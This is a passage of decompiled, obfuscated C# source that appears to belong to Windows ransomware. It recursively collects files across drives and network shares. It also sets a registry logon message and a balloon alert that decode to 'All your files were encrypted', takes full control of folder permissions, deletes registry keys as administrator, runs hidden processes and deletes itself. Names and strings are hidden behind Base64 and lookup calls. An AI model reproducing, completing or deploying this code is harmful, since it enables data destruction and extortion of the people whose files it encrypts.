		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> zGNZkBWbcg(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107350004)) && !text.Contains(getString_0(107349979)) && !text.Contains(getString_0(107349946)) && !text.ToLower().Contains(getString_0(107349961)) && !text.ToLower().Contains(getString_0(107349916)) && !text.Contains(getString_0(107349923)) && !text.Contains(getString_0(107349902)) && !text.ToLower().Contains(getString_0(107349889)) && !text.ToLower().Contains(getString_0(107349332)) && !text.ToLower().Contains(getString_0(107349327)) && !text.ToLower().Contains(getString_0(107349318)) && !text.ToLower().Contains(getString_0(107349269)) && !text.ToLower().Contains(getString_0(107349288)) && !text.ToLower().Contains(getString_0(107349243)) && !text.ToLower().Contains(getString_0(107349254)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107349229)) && !fileInfo.FullName.Contains(getString_0(107349180)) && !fileInfo.FullName.Contains(getString_0(107349195)) && !fileInfo.FullName.Contains(getString_0(107349146)) && !fileInfo.FullName.Contains(getString_0(107349161)) && !fileInfo.FullName.Contains(getString_0(107349112)) && !fileInfo.FullName.Contains(getString_0(107349127)) && !fileInfo.FullName.Contains(getString_0(107349590)) && !fileInfo.FullName.Contains(getString_0(107349609)) && !fileInfo.FullName.Contains(getString_0(107349556)) && !fileInfo.FullName.ToLower().Contains(getString_0(107349575)) && !fileInfo.FullName.ToLower().Contains(getString_0(107349530)) && !fileInfo.FullName.ToLower().Contains(getString_0(107349545)) && !fileInfo.FullName.ToLower().Contains(getString_0(107349496)) && !fileInfo.FullName.Contains(gvCYkntYkqMW(getString_0(107349511))) && !fileInfo.FullName.Contains(getString_0(107349486)) && !fileInfo.FullName.Contains(getString_0(107349473)) && !fileInfo.FullName.Contains(getString_0(107349456)) && !fileInfo.FullName.EndsWith(getString_0(107395789)) && !fileInfo.FullName.EndsWith(getString_0(107349399)) && !fileInfo.FullName.EndsWith(getString_0(107349394)) && !fileInfo.FullName.EndsWith(getString_0(107349421)) && !fileInfo.FullName.EndsWith(getString_0(107349416)) && !fileInfo.FullName.Contains(getString_0(107349411)) && !fileInfo.FullName.Contains(ntagmnsgvSkoTT) && !fileInfo.FullName.Contains(vzSBJQFXpb) && !fileInfo.FullName.Contains(kVZoVJTgfl))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(HYSHgMyGCmRaP) * 1024.0 * 1024.0 && txqzvgdCEQF == getString_0(107396927))
						{
							list.Add(fileInfo.FullName);
							NfBbtNwXVTws(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && txqzvgdCEQF == getString_0(107396844))
						{
							list.Add(fileInfo.FullName);
							NfBbtNwXVTws(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void sGayiJLLhfGgF()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107349362));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!RSEYqZQHxTlgU.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107348797), getString_0(107396817)).Replace(getString_0(107348792), getString_0(107348797))
					.Replace(getString_0(107348815), getString_0(107350535))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					RSEYqZQHxTlgU.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107348797), getString_0(107396817)).Replace(getString_0(107348792), getString_0(107348797))
						.Replace(getString_0(107348815), getString_0(107350535))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107348810), getString_0(107350535)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string sroZTJGCRhFP(string HCFGkemRIGTjdq = "", string sWGxkLJkuUC = "")
	{
		string result = getString_0(107350535);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = HCFGkemRIGTjdq,
				Arguments = sWGxkLJkuUC,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void CRiQbGVehMvbeq(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107348801),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string jCEtgwbUwXnV(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string gvCYkntYkqMW(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void kUVvRAQAtiVXGy(string fUhqXenHOZk = "", string ziDGeyzxbmk = "SW5mb3JtYXRpb24uLi4=", string btydxcIWfpAyH = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		fUhqXenHOZk = jCEtgwbUwXnV(getString_0(107348784));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(gvCYkntYkqMW(fUhqXenHOZk), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(gvCYkntYkqMW(getString_0(107348687)), gvCYkntYkqMW(ziDGeyzxbmk));
				registryKey.SetValue(gvCYkntYkqMW(getString_0(107348654)), gvCYkntYkqMW(btydxcIWfpAyH));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			fUhqXenHOZk = jCEtgwbUwXnV(getString_0(107348593));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(gvCYkntYkqMW(fUhqXenHOZk), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(gvCYkntYkqMW(getString_0(107349032)), gvCYkntYkqMW(ziDGeyzxbmk));
				registryKey.SetValue(gvCYkntYkqMW(getString_0(107348999)), gvCYkntYkqMW(btydxcIWfpAyH));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void vKInFAeIsKtc()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (KBJvdPMmjzTQDS == getString_0(107396927) && !string.IsNullOrEmpty(qwKvoNoQFi) && !string.IsNullOrEmpty(ZstNmYcaky))
				{
					kUVvRAQAtiVXGy(getString_0(107350535), qwKvoNoQFi, ZstNmYcaky);
				}
				else
				{
					kUVvRAQAtiVXGy(getString_0(107350535), getString_0(107350460), getString_0(107350431));
				}
			}
		}
		catch
		{
		}
	}

	public static void orbStwiBbUb(string eXNDgXpTMJNo = "SW5mb3JtYXRpb24uLi4=", string ZUGYCbpkjBhFbRp = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(gvCYkntYkqMW(eXNDgXpTMJNo));
		val.set_BalloonTipText(gvCYkntYkqMW(ZUGYCbpkjBhFbRp));
		val.ShowBalloonTip(30000);
	}

	public static void mgVkCbxDdYLKyGu(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		sroZTJGCRhFP(gvCYkntYkqMW(getString_0(107348970)), getString_0(107348921) + text + getString_0(107348944) + string_0);
	}

	private static void gGiPQhlsaEDD()
	{
		//IL_0297: Unknown result type (might be due to invalid IL or missing references)
		//IL_029e: Expected O, but got Unknown
		//IL_02c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c7: Expected O, but got Unknown
		OuwslfEqACx();
		List<TxBKgQVchDeTS> list = TxBKgQVchDeTS.QnpHqmCNtB();
		foreach (TxBKgQVchDeTS item in list)
		{
			ytjIPDBCZRI.Add(item.IPAddress);
		}
		List<string> source = ytjIPDBCZRI;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a = delegate(string string_0)
			{
				RnVSXGpvaRmkK CS_0024_003C_003E8__locals0 = new RnVSXGpvaRmkK();
				CS_0024_003C_003E8__locals0.zLyXgmOylkgYnX = string_0;
				if ((!CS_0024_003C_003E8__locals0.zLyXgmOylkgYnX.StartsWith(getString_0(107377866)) && !CS_0024_003C_003E8__locals0.zLyXgmOylkgYnX.StartsWith(getString_0(107377861)) && !CS_0024_003C_003E8__locals0.zLyXgmOylkgYnX.StartsWith(getString_0(107377820)) && !CS_0024_003C_003E8__locals0.zLyXgmOylkgYnX.StartsWith(getString_0(107377839))) || !TaboJirPIvtr.yThKTqJWNfEEXwD(CS_0024_003C_003E8__locals0.zLyXgmOylkgYnX))
				{
					return;
				}
				try
				{
					Thread.Sleep(ywMnaFcwkyBX);
					RSEYqZQHxTlgU.Add(getString_0(107348797) + CS_0024_003C_003E8__locals0.zLyXgmOylkgYnX + getString_0(107377830));
					try
					{
						if (WmRKwcdDWVtNion)
						{
							Console.WriteLine(getString_0(107348797) + CS_0024_003C_003E8__locals0.zLyXgmOylkgYnX + getString_0(107377830));
						}
					}
					catch
					{
					}
					Parallel.For(68, 91, delegate(int int_0)
					{
						Thread.Sleep(ywMnaFcwkyBX);
						RSEYqZQHxTlgU.Add(RnVSXGpvaRmkK.getString_0(107348803) + CS_0024_003C_003E8__locals0.zLyXgmOylkgYnX + RnVSXGpvaRmkK.getString_0(107396823) + (char)int_0 + RnVSXGpvaRmkK.getString_0(107459764));
						try
						{
							if (WmRKwcdDWVtNion)
							{
								Console.WriteLine(RnVSXGpvaRmkK.getString_0(107348803) + CS_0024_003C_003E8__locals0.zLyXgmOylkgYnX + RnVSXGpvaRmkK.getString_0(107396823) + (char)int_0 + RnVSXGpvaRmkK.getString_0(107459764));
							}
						}
						catch
						{
						}
					});
				}
				catch
				{
				}
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a);
		try
		{
			if (WmRKwcdDWVtNion)
			{
				Console.WriteLine(getString_0(107348939));
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = jCEtgwbUwXnV(getString_0(107348593));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(gvCYkntYkqMW(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(gvCYkntYkqMW(getString_0(107348898)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(gvCYkntYkqMW(getString_0(107348329)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (tqiTaLTjAiFsV == getString_0(107396927))
		{
			try
			{
				string text = Path.GetTempFileName().Replace(getString_0(107348252), getString_0(107348243));
				File.WriteAllText(text, gvCYkntYkqMW(getString_0(107348266)), Encoding.ASCII);
				sroZTJGCRhFP(getString_0(107396839), getString_0(107379948) + text);
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107379943))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107379943)));
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107379902))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107379902)));
				}
			}
			catch
			{
			}
		}
		try
		{
			if (WmRKwcdDWVtNion)
			{
				Console.WriteLine(getString_0(107379893));
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107349362));
		ManagementObjectEnumerator enumerator2 = val.Get().GetEnumerator();
		try
		{
			while (enumerator2.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator2.get_Current();
				if (RSEYqZQHxTlgU.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107348797), getString_0(107396817)).Replace(getString_0(107348792), getString_0(107348797))
					.Replace(getString_0(107348815), getString_0(107350535))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (WmRKwcdDWVtNion)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107348797), getString_0(107396817)).Replace(getString_0(107348792), getString_0(107348797))
							.Replace(getString_0(107348815), getString_0(107350535))
							.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107348810), getString_0(107350535)));
					}
				}
				catch
				{
				}
				RSEYqZQHxTlgU.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107348797), getString_0(107396817)).Replace(getString_0(107348792), getString_0(107348797))
					.Replace(getString_0(107348815), getString_0(107350535))
					.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107348810), getString_0(107350535)));
			}
		}
		finally
		{
			((IDisposable)enumerator2)?.Dispose();
		}
		try
		{
			if (WmRKwcdDWVtNion)
			{
				Console.WriteLine(getString_0(107379836));
			}
		}
		catch
		{
		}
	}

	public static bool XtjIIMlJpCnPhAQ()
	{
		WebRequest webRequest = WebRequest.Create(getString_0(107380279));
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void rrqSgYKwbeTjR(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = gvCYkntYkqMW(getString_0(107380246));
		processStartInfo.Arguments = getString_0(107380217) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool bFzPnDXkjRV(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool iLSxvwUkKj(string string_0)
	{
		try
		{
			MIYCMGQzHX CS_0024_003C_003E8__locals0 = new MIYCMGQzHX();
			DriveInfo[] drives = DriveInfo.GetDrives();
			CS_0024_003C_003E8__locals0.IkizUsEYpWGwM = Path.GetPathRoot(string_0);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo driveInfo_0) => driveInfo_0.RootDirectory.Name == CS_0024_003C_003E8__locals0.IkizUsEYpWGwM);
			return driveInfo != null && driveInfo.DriveFormat == getString_0(107380212);
		}
		catch
		{
			return false;
		}
	}

	public static string SmmjZvGwyas(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void YaLCqtEcgIco()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = jCEtgwbUwXnV(getString_0(107380235));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(gvCYkntYkqMW(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(gvCYkntYkqMW(getString_0(107380097)));
					registryKey.DeleteSubKey(gvCYkntYkqMW(getString_0(107379560)));
					registryKey.DeleteSubKey(gvCYkntYkqMW(getString_0(107379511)));
					registryKey.DeleteSubKey(gvCYkntYkqMW(getString_0(107379486)));
					registryKey.DeleteSubKey(gvCYkntYkqMW(getString_0(107380246)));
					registryKey.DeleteSubKey(gvCYkntYkqMW(getString_0(107379493)));
					registryKey.DeleteSubKey(gvCYkntYkqMW(getString_0(107348970)));
					registryKey.Close();
				}
				string_ = jCEtgwbUwXnV(getString_0(107379464));
				registryKey = Registry.LocalMachine.OpenSubKey(gvCYkntYkqMW(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(gvCYkntYkqMW(getString_0(107379367)));
					registryKey.Close();
				}
				string_ = jCEtgwbUwXnV(getString_0(107379318));
				registryKey = Registry.LocalMachine.OpenSubKey(gvCYkntYkqMW(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(gvCYkntYkqMW(getString_0(107379367)));
					registryKey.Close();
				}
				string_ = jCEtgwbUwXnV(getString_0(107379318));
				registryKey = Registry.CurrentUser.OpenSubKey(gvCYkntYkqMW(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(gvCYkntYkqMW(getString_0(107379367)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			sroZTJGCRhFP(gvCYkntYkqMW(getString_0(107379333)), gvCYkntYkqMW(getString_0(107379796)));
			sroZTJGCRhFP(gvCYkntYkqMW(getString_0(107379779)), gvCYkntYkqMW(getString_0(107379738)));
			sroZTJGCRhFP(gvCYkntYkqMW(getString_0(107379779)), gvCYkntYkqMW(getString_0(107379624)));
			sroZTJGCRhFP(gvCYkntYkqMW(getString_0(107379051)), gvCYkntYkqMW(getString_0(107379002)));
		}
		catch
		{
		}
	}

	public static void emEmxwYCVRMX(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(gvCYkntYkqMW(getString_0(107378929)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void shCNKMfZJMFlBE()
	{
		string string_ = jCEtgwbUwXnV(getString_0(107378904));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(gvCYkntYkqMW(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(gvCYkntYkqMW(getString_0(107378855)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void OuwslfEqACx()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			sroZTJGCRhFP(gvCYkntYkqMW(getString_0(107378822)), gvCYkntYkqMW(getString_0(107379289)));
			sroZTJGCRhFP(gvCYkntYkqMW(getString_0(107378822)), gvCYkntYkqMW(getString_0(107379159)));
		}
	}

	public static void qiPuQJEhLmRex()
	{
		sroZTJGCRhFP(getString_0(107396839), gvCYkntYkqMW(getString_0(107378533)));
		string text = gvCYkntYkqMW(getString_0(107378339));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107348815) + text + getString_0(107348815) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396839);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void LsmwFBnODGufLo(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (JJYUPCZGaGN)
			{
				try
				{
					File.AppendAllText(vzSBJQFXpb, getString_0(107378786) + string_0 + getString_0(107378745) + ex.Message + getString_0(107397154));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string fzBOSVsSHwJOy()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107350535);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107378656);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107378679))) ? getString_0(107378693) : getString_0(107378702));
				break;
			case 0:
				text = getString_0(107378684);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107378651);
				break;
			case 4:
				text = getString_0(107378670);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107378620) : getString_0(107378661));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107378628) : getString_0(107378633)) : getString_0(107378638)) : getString_0(107378615));
				break;
			case 10:
				text = getString_0(107378591);
				break;
			}
		}
		if (text != getString_0(107350535))
		{
			text = getString_0(107378586) + text;
			if (oSVersion.ServicePack != getString_0(107350535))
			{
				text = text + getString_0(107348944) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string fhNGEWEqlpc(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395711);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(gvCYkntYkqMW(getString_0(107396190)));
				streamWriter.WriteLine(getString_0(107397154));
				streamWriter.WriteLine(gvCYkntYkqMW(getString_0(107390692)));
				streamWriter.WriteLine(string_0);
				if (FAXnWIlLgke)
				{
					streamWriter.WriteLine(getString_0(107397154));
					streamWriter.WriteLine(gvCYkntYkqMW(getString_0(107391062)));
					streamWriter.WriteLine(UuDMKkzrJStt.GtkPFNFnFTX());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !CVCyEBDPJVibYms)
				{
					File.AppendAllText(text, getString_0(107391029) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (JJYUPCZGaGN)
			{
				try
				{
					File.AppendAllText(vzSBJQFXpb, getString_0(107378605) + ex.Message + getString_0(107397154));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void TpshjRdvQRXF(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		RyVCddrLRFl.LqeTCRjpNGZeaX CS_0024_003C_003E8__locals0 = new RyVCddrLRFl();
		CS_0024_003C_003E8__locals0.BnSdRueHezo = string_1;
		CS_0024_003C_003E8__locals0.ADOCvRsQgZIc = string_2;
		CS_0024_003C_003E8__locals0.FdoRuIdHkWuYD = string_3;
		CS_0024_003C_003E8__locals0.gwLOovozMz = string_4;
		xdThOOfnYmOX = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.FdoRuIdHkWuYD);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396346))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !RSEYqZQHxTlgU.Contains(array[i].Name))
					{
						RSEYqZQHxTlgU.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!RSEYqZQHxTlgU.Contains(string_0[j]))
				{
					RSEYqZQHxTlgU.Add(string_0[j]);
				}
			}
		}
		if (RSEYqZQHxTlgU.Contains(gvCYkntYkqMW(getString_0(107378004))) && VFNHlTCAhVOW == getString_0(107396927))
		{
			RSEYqZQHxTlgU.Remove(gvCYkntYkqMW(getString_0(107378004)));
		}
		Parallel.ForEach(RSEYqZQHxTlgU, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new RyVCddrLRFl.LqeTCRjpNGZeaX();
			CS_0024_003C_003E8__locals0.RTdpThbyDRnl = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.FYzFmVHDBpSMebb = string_0;
			if (YgToHXrQdwK && !fzBOSVsSHwJOy().Contains(RyVCddrLRFl.getString_0(107378632)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						bFzPnDXkjRV(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.FYzFmVHDBpSMebb);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (GUXQCPvWRuYo == RyVCddrLRFl.getString_0(107396939))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					JhydZjHCrfwXm(CS_0024_003C_003E8__locals0.FYzFmVHDBpSMebb, CS_0024_003C_003E8__locals0.RTdpThbyDRnl.BnSdRueHezo, CS_0024_003C_003E8__locals0.RTdpThbyDRnl.gwLOovozMz, CS_0024_003C_003E8__locals0.RTdpThbyDRnl.ADOCvRsQgZIc, CS_0024_003C_003E8__locals0.RTdpThbyDRnl.FdoRuIdHkWuYD);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				JhydZjHCrfwXm(CS_0024_003C_003E8__locals0.FYzFmVHDBpSMebb, CS_0024_003C_003E8__locals0.BnSdRueHezo, CS_0024_003C_003E8__locals0.gwLOovozMz, CS_0024_003C_003E8__locals0.ADOCvRsQgZIc, CS_0024_003C_003E8__locals0.FdoRuIdHkWuYD);
			}
		});
	}

	public static void JhydZjHCrfwXm(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107350535));
		List<string> list3 = list2;
		if (cSURllrGISXxER == getString_0(107396844))
		{
			if (eqYgovaJkUYKPn == getString_0(107396927) && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && iLSxvwUkKj(string_0))
			{
				vsQXEBAtRsiO vsQXEBAtRsiO = null;
				try
				{
					vsQXEBAtRsiO = new vsQXEBAtRsiO(string_0.Replace(getString_0(107396817), getString_0(107350535)));
				}
				catch
				{
					list = zGNZkBWbcg(string_0, string_1, string_2, string_3, string_4);
					return;
				}
				try
				{
					NfBbtNwXVTws(vsQXEBAtRsiO.ToArray().ToList(), string_1, string_2, string_3, string_4);
					return;
				}
				catch (Exception)
				{
					list = zGNZkBWbcg(string_0, string_1, string_2, string_3, string_4);
					return;
				}
			}
			list = zGNZkBWbcg(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = PyeOeBRNGpCRPVMr.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0458;
					}
				}
				if ((OBXPdvxMybik == getString_0(107396844) && !item.EndsWith(text)) || GfJosmTooKpZJP.Contains(item))
				{
					continue;
				}
				if (uvAbidagcyNet == getString_0(107396927))
				{
					try
					{
						if (hvlXQSEyNEuZ.rbQAJqTFuy(item))
						{
